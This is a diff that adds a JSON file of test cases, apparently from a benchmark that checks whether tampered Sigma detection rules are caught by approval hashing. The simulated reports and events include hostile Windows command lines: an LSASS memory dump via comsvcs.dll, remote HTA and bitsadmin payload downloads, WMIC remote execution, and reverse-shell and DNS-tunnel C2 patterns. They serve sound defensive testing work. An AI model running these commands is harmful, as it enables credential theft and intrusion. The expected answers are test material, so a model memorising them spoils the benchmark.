@@ -1,0 +1,473 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D10",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "rundll32.exe user32.dll,LockWorkStation",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\Documents\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Users\\Public\\lsass.dmp full",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-backup"
+     },
+     {
+      "cmd": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1048 C:\\Users\\Public\\lsass2.dmp full",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-backup"
+     }
+    ]
+   },
+   "evidence": [
+    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Users\\Public\\lsass.dmp full",
+    "Analysts saw the same comsvcs.dll MiniDump invocation on two further servers within the hour"
+   ],
+   "expected_gate": "approval-binding",
+   "id": "D10-01",
+   "logsource": "windows_process_creation",
+   "report_text": "During the intrusion the operator obtained domain credentials without dropping any custom tooling. On the file server the operator opened an interactive cmd.exe and identified the LSASS process identifier with tasklist. The operator then dumped the process memory with a living-off-the-land technique, running rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Users\\Public\\lsass.dmp full from the command shell. The dump was written under the Public profile, compressed with the built-in tar utility and deleted after transfer. Analysts saw the same comsvcs.dll MiniDump invocation on two further servers within the hour, each time with a different process identifier. No malware binary was involved, so detection has to rely on the command line rather than file hashes.",
+   "role": "defective",
+   "sigma_yaml": "title: LSASS Memory Dump via Rundll32 Comsvcs MiniDump\nid: 3f9c2a7e-5b1d-4c68-9a42-8d7e1f0b6c31\nstatus: experimental\ndescription: Detects rundll32.exe loading comsvcs.dll and calling the MiniDump export, a living-off-the-land method of dumping LSASS process memory.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.credential_access\n  - attack.t1003.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    CommandLine|contains|all:\n      - 'comsvcs.dll'\n      - 'MiniDump'\n  condition: selection\nfalsepositives:\n  - Legitimate crash-dump collection by administrators using comsvcs.dll MiniDump\nlevel: high\n",
+   "tamper_sigma_yaml": "title: LSASS Memory Dump via Rundll32 Comsvcs MiniDump\nid: 3f9c2a7e-5b1d-4c68-9a42-8d7e1f0b6c31\nstatus: experimental\ndescription: Detects rundll32.exe loading comsvcs.dll and calling the MiniDump export, a living-off-the-land method of dumping LSASS process memory.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.credential_access\n  - attack.t1003.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n  condition: selection\nfalsepositives:\n  - Legitimate crash-dump collection by administrators using comsvcs.dll MiniDump\nlevel: high\n",
+   "techniques": [
+    "T1003.001"
+   ],
+   "why": "The approved rule requires rundll32.exe together with comsvcs.dll and MiniDump on the command line. The tampered copy deletes the whole CommandLine condition, so it alerts on every rundll32.exe execution (including the Control_RunDLL and LockWorkStation look-alikes) and has no discriminating term, and its SHA-256 no longer equals the approved hash."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D10",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "psrepo.cranemail.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "files.intranet-portal.example"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "mail.cranemail.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "time.cranemail.test"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "4a6f686e2d4c.tunnel-relay.invalid"
+     },
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "6d795f7365637265.tunnel-relay.invalid"
+     }
+    ]
+   },
+   "evidence": [
+    "sends it as the leftmost label of a query, for example 4a6f686e2d4c.tunnel-relay.invalid",
+    "Each beacon is issued by powershell.exe roughly every ninety seconds"
+   ],
+   "expected_gate": "approval-binding",
+   "id": "D10-02",
+   "logsource": "windows_dns_query",
+   "report_text": "Telemetry from the finance subnet showed a PowerShell-based implant using DNS as its command channel. The script encodes each outbound message in hexadecimal and sends it as the leftmost label of a query, for example 4a6f686e2d4c.tunnel-relay.invalid, while replies arrive as TXT answers that the script decodes and runs. Each beacon is issued by powershell.exe roughly every ninety seconds, and queries under tunnel-relay.invalid were seen from six hosts. No direct web traffic to the operator infrastructure was recorded, so the DNS log is the only reliable detection source.",
+   "role": "defective",
+   "sigma_yaml": "title: DNS Tunnelling Queries from PowerShell to Tunnel Relay Domain\nid: a81d5e94-2c7b-4f03-b6a9-51e3c8d7f2a0\nstatus: experimental\ndescription: Detects powershell.exe resolving hex-encoded labels under the tunnel-relay.invalid domain used for DNS command and control.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    QueryName|contains: 'tunnel-relay.invalid'\n  condition: selection\nfalsepositives:\n  - Security staff testing the sinkholed tunnel-relay.invalid domain\nlevel: high\n",
+   "tamper_sigma_yaml": "title: DNS Tunnelling Queries from PowerShell to Tunnel Relay Domain\nid: a81d5e94-2c7b-4f03-b6a9-51e3c8d7f2a0\nstatus: experimental\ndescription: Detects powershell.exe resolving hex-encoded labels under the tunnel-relay.invalid domain used for DNS command and control.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    QueryName|contains: 'tunnel-relay.invalid'\n  selection_extra:\n    QueryName|endswith: '.cranemail.test'\n  condition: selection or selection_extra\nfalsepositives:\n  - Security staff testing the sinkholed tunnel-relay.invalid domain\nlevel: high\n",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "The approved rule matches only powershell.exe resolving names under tunnel-relay.invalid. The tampered copy adds a second selection joined with 'or' that matches any query ending in .cranemail.test, which is unrelated to the DNS command-and-control behaviour, so ordinary mail and time lookups (negative events) and benign PowerShell lookups (look-alike) now alert, and the rule content hash differs from the approved one."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D10",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.88",
+      "dest_port": "5985",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.30",
+      "dest_port": "443",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.20",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.5",
+      "dest_port": "445",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.50",
+      "dest_port": "4444",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.50",
+      "dest_port": "4444",
+      "image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "powershell.exe connecting out to 203.0.113.50 on port 4444, a port that is not used by any approved application in the environment",
+    "The same address and port pairing was used from two other endpoints in the days that followed"
+   ],
+   "expected_gate": "approval-binding",
+   "id": "D10-03",
+   "logsource": "windows_network_connection",
+   "report_text": "The operator's reverse shell was started from a PowerShell one-liner on the kiosk host. Network logs show powershell.exe connecting out to 203.0.113.50 on port 4444, a port that is not used by any approved application in the environment, and holding the session open for several hours. The operator chose the non-standard port to avoid the proxy that inspects traffic on ports 80 and 443. The same address and port pairing was used from two other endpoints in the days that followed, and responders confirmed that the listener on 203.0.113.50 was an operator-controlled host.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Outbound Connection to Operator Host on Port 4444\nid: 6e0b4d12-9f38-4a57-8c1e-d2a7b5039e64\nstatus: experimental\ndescription: Detects powershell.exe opening a network connection to the operator host 203.0.113.50 on non-standard TCP port 4444.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    DestinationIp: '203.0.113.50'\n    DestinationPort: 4444\n  condition: selection\nfalsepositives:\n  - Penetration test exercises using the same listener address\nlevel: high\n",
+   "tamper_sigma_yaml": "title: PowerShell Outbound Connection to Operator Host on Port 4444\nid: 6e0b4d12-9f38-4a57-8c1e-d2a7b5039e64\nstatus: experimental\ndescription: Detects powershell.exe opening a network connection to the operator host 203.0.113.50 on non-standard TCP port 4444.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    DestinationIp: '203.0.113.50'\n    DestinationPort: 4444\n  condition: selection\nfalsepositives:\n  - Penetration test exercises using the same listener address\nlevel: low\n",
+   "techniques": [
+    "T1571"
+   ],
+   "why": "Only the level line is changed, from high to low. The detection logic, tags and metadata are untouched so every logic test and gate still passes on the tampered file, but the downgrade lowers alert priority for a confirmed C2 channel and changes the SHA-256 of the approved content, so only the approval binding can catch it."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D10",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "mshta.exe C:\\Program Files\\CorpHelp\\about.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "calc.exe",
+      "image": "C:\\Windows\\System32\\calc.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "cmd.exe /c dir C:\\Users\\bob",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "mshta.exe http://cdn-sync.example/stage.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "mshta.exe https://cdn-sync.example/stage.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "The operator launched mshta.exe with a remote HTA, either http://cdn-sync.example/stage.hta or https://cdn-sync.example/stage.hta, which then started powershell.exe to download the next stage",
+    "mshta.exe reaching out to a web address is the constant element in all observed cases"
+   ],
+   "expected_gate": "approval-binding",
+   "id": "D10-04",
+   "logsource": "windows_process_creation",
+   "report_text": "A malicious shortcut delivered by email caused the user's session to start a signed Windows binary rather than a dropper. The operator launched mshta.exe with a remote HTA, either http://cdn-sync.example/stage.hta or https://cdn-sync.example/stage.hta, which then started powershell.exe to download the next stage. The HTA file contains script that spawns a hidden PowerShell process, so analysts tracked both the proxy execution of the HTA and the PowerShell execution that followed. Defenders should expect the URL to change between victims, but mshta.exe reaching out to a web address is the constant element in all observed cases.",
+   "role": "defective",
+   "sigma_yaml": "title: Mshta Launching Remote HTA Content\nid: c24f7a8b-1e63-4d95-a0b7-3f9e6c218d57\nstatus: experimental\ndescription: Detects mshta.exe started with an http or https URL on the command line to fetch and run a remote HTA payload.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n    CommandLine|contains:\n      - 'http://'\n      - 'https://'\n  condition: selection\nfalsepositives:\n  - Legacy intranet applications that still load HTA pages from an internal web server\nlevel: high\n",
+   "tamper_sigma_yaml": "title: Mshta Launching Remote HTA Content\nid: c24f7a8b-1e63-4d95-a0b7-3f9e6c218d57\nstatus: experimental\ndescription: Detects mshta.exe started with an http or https URL on the command line to fetch and run a remote HTA payload.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n    CommandLine|contains:\n      - 'http://'\n      - 'https://'\n  condition: selection\nfalsepositives:\n  - Legacy intranet applications that still load HTA pages from an internal web server\nlevel: high\n",
+   "techniques": [
+    "T1218.005",
+    "T1059.001"
+   ],
+   "why": "The detection block is unchanged, but the technique tags are rewritten from T1218.005 (Mshta, stealth) to T1059.001 (PowerShell, execution). T1059.001 is also cited by the report so a tag-validity check can still pass, yet the rule is now mis-attributed in coverage and triage, and the content hash differs from the approved one."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D10",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "bitsadmin.exe /transfer patchjob /download /priority normal http://updates.corp.example/patch.msu C:\\Windows\\Temp\\patch.msu",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ping 192.0.2.1",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "whoami /groups",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "bitsadmin.exe /transfer job1 /download /priority high http://files-mirror.example/agent.bin C:\\ProgramData\\agent.bin",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\carol"
+     },
+     {
+      "cmd": "bitsadmin /transfer upd2 /download http://files-mirror.example/cfg.dat C:\\ProgramData\\Microsoft\\cfg.dat",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "bitsadmin.exe /transfer job1 /download /priority high http://files-mirror.example/agent.bin C:\\ProgramData\\agent.bin",
+    "The same /transfer pattern with a C:\\ProgramData destination appeared on four hosts"
+   ],
+   "expected_gate": "approval-binding",
+   "id": "D10-05",
+   "logsource": "windows_process_creation",
+   "report_text": "The loader on the engineering workstation was staged using BITS rather than a browser. The command recorded was bitsadmin.exe /transfer job1 /download /priority high http://files-mirror.example/agent.bin C:\\ProgramData\\agent.bin, executed from a command shell opened by the operator. Writing the payload into ProgramData rather than a user profile directory let it survive profile clean-up and made it readable by every account on the host. A follow-up scheduled task started the downloaded agent at the next logon. The same /transfer pattern with a C:\\ProgramData destination appeared on four hosts.",
+   "role": "defective",
+   "sigma_yaml": "title: BITSAdmin Transfer to ProgramData\nid: 07d9e3b5-a4c2-4816-9f0d-b6e1a73c5280\nstatus: experimental\ndescription: Detects bitsadmin.exe creating a transfer job that writes the downloaded file into the ProgramData directory.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.stealth\n  - attack.t1197\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\bitsadmin.exe'\n    CommandLine|contains|all:\n      - '/transfer'\n      - '\\ProgramData\\'\n  condition: selection\nfalsepositives:\n  - Administrators deploying files into ProgramData with bitsadmin\nlevel: medium\n",
+   "tamper_sigma_yaml": "title: BITSAdmin Transfer to ProgramData\nid: 07d9e3b5-a4c2-4816-9f0d-b6e1a73c5280\nstatus: experimental\ndescription: Detects bitsadmin.exe creating a transfer job that writes the downloaded file into the ProgramData directory.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.stealth\n  - attack.t1197\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\bitsadmin.exe'\n    CommandLine|contains|all:\n      - '/transfer'\n      - '\\Temp\\'\n  condition: selection\nfalsepositives:\n  - Administrators deploying files into ProgramData with bitsadmin\nlevel: medium\n",
+   "techniques": [
+    "T1197"
+   ],
+   "why": "The approved rule requires bitsadmin.exe /transfer with a destination under \\ProgramData\\, where the report says the payload was written. The tampered copy swaps that path for \\Temp\\, a plausible-looking change that makes the rule miss both positive events and alert on the benign patch-deployment look-alike, and the SHA-256 differs from the approved content."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D10",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "wmic.exe /node:FS02 os get lastbootuptime",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\itadmin"
+     },
+     {
+      "cmd": "wmic.exe process list brief",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\todo.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ipconfig /flushdns",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "wmic.exe /node:FS02 process call create C:\\Users\\Public\\r.exe",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-deploy"
+     },
+     {
+      "cmd": "wmic.exe /node:DC01 process call create C:\\Users\\Public\\r.exe",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\svc-deploy"
+     }
+    ]
+   },
+   "evidence": [
+    "wmic.exe /node:FS02 process call create C:\\Users\\Public\\r.exe",
+    "The commands were issued both from cmd.exe and from powershell.exe on the pivot host"
+   ],
+   "expected_gate": "approval-binding",
+   "id": "D10-06",
+   "logsource": "windows_process_creation",
+   "report_text": "Lateral movement from the pivot host to file and domain servers relied on WMI command execution. The operator ran wmic.exe /node:FS02 process call create C:\\Users\\Public\\r.exe against the file server and repeated the same pattern against the domain controller. The commands were issued both from cmd.exe and from powershell.exe on the pivot host, so detection cannot depend on a single parent process. Each invocation started the remote payload within seconds and no remote service installation was needed. The process call create method against remote nodes was observed eleven times over two days.",
+   "role": "defective",
+   "sigma_yaml": "title: WMIC Remote Process Creation\nid: e5a1c7f3-8d04-4b29-b3e6-94a0d2f81c7b\nstatus: experimental\ndescription: Detects wmic.exe invoking process call create, used by the operator for remote command execution.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1047\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\wmic.exe'\n    CommandLine|contains: 'process call create'\n  condition: selection\nfalsepositives:\n  - Legacy administration scripts that start programs through wmic\nlevel: high\n",
+   "tamper_sigma_yaml": "title: WMIC Remote Process Creation\nid: e5a1c7f3-8d04-4b29-b3e6-94a0d2f81c7b\nstatus: experimental\ndescription: Detects wmic.exe invoking process call create, used by the operator for remote command execution.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1047\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\wmic.exe'\n    CommandLine|contains: 'process call create'\n  filter_automation:\n    ParentImage|endswith: '\\powershell.exe'\n  condition: selection and not filter_automation\nfalsepositives:\n  - Legacy administration scripts that start programs through wmic\nlevel: high\n",
+   "techniques": [
+    "T1047"
+   ],
+   "why": "The tampered copy adds a filter that excludes any event whose parent is powershell.exe, which looks like an exclusion for admin automation. The report states the attacker ran wmic.exe process call create from both cmd.exe and powershell.exe, so the exclusion blinds the rule to the PowerShell-driven pattern (positive event 2), and the content hash differs from the approved rule."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D10",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.44",
+      "dest_port": "80",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "192.0.2.10",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.20",
+      "dest_port": "123",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "198.51.100.77",
+      "dest_port": "80",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.77",
+      "dest_port": "80",
+      "image": "C:\\Windows\\SysWOW64\\certutil.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "certutil.exe, normally used for certificate management, was observed making a direct outbound HTTP connection to 198.51.100.77 on port 80",
+    "The same host was contacted by certutil.exe on three workstations within one afternoon"
+   ],
+   "expected_gate": "approval-binding",
+   "id": "D10-07",
+   "logsource": "windows_network_connection",
+   "report_text": "Endpoint network telemetry showed a signed system utility being abused as a downloader. certutil.exe, normally used for certificate management, was observed making a direct outbound HTTP connection to 198.51.100.77 on port 80 to pull the second-stage payload. The same host was contacted by certutil.exe on three workstations within one afternoon, and no browser or update agent was involved in any of the connections. Analysts assessed the 198.51.100.77 address as an operator staging server. Routine certificate revocation lookups by certutil.exe go to the internal PKI servers and were not part of this activity.",
+   "role": "defective",
+   "sigma_yaml": "title: Certutil Network Connection to Staging Host\nid: 5b8e2d60-f7a1-4c34-8e95-0c3d9a1b7f46\nstatus: experimental\ndescription: Detects certutil.exe making an outbound connection to the staging host 198.51.100.77 to retrieve a payload.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n    DestinationIp: '198.51.100.77'\n  condition: selection\nfalsepositives:\n  - Security testing against the sinkholed staging address\nlevel: high\n",
+   "tamper_sigma_yaml": "title: Certutil Network Connection to Staging Host \nid: 5b8e2d60-f7a1-4c34-8e95-0c3d9a1b7f46\nstatus: experimental\ndescription: Detects certutil.exe making an outbound connection to the staging host 198.51.100.77 to retrieve a payload.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n    DestinationIp: '198.51.100.77'\n  condition: selection\nfalsepositives:\n  - Security testing against the sinkholed staging address\nlevel: high\n",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "The only change is one trailing space appended to the title line. The YAML parses to an identical rule and behaves identically on every test, but the bytes, and therefore the SHA-256 of the exact rule content, differ from what was approved, so an approval bound to exact content must be voided and the deployment check must fail; a system that normalises or ignores the change does not enforce exact-content binding."
+  }
+ ]
+}
